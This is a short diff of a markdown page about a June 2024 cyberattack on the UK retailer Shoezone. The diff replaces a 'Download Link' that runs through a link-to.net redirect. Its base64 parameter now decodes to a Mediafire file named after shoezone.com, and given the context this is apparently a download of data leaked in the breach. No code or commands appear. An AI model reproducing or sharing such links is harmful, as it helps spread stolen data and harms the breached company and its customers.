@@ -12,4 +12,4 @@ In June 2024, <a href="https://cybernews.com/news/shoezone-cyberattack-uk-retail
 
 ## Links
 
-[Download Link](https://link-to.net/1229997/923.9247855406126/dynamic/?r=c2hvZXpvbmUuY29t)
+[Download Link](https://link-to.net/1229997/255.2837434362759/dynamic/?r=aHR0cHM6Ly93d3cubWVkaWFmaXJlLmNvbS92aWV3L1RxZjZndHN4eEIyckRqVi9zaG9lem9uZS5jb20vZmlsZQ==)
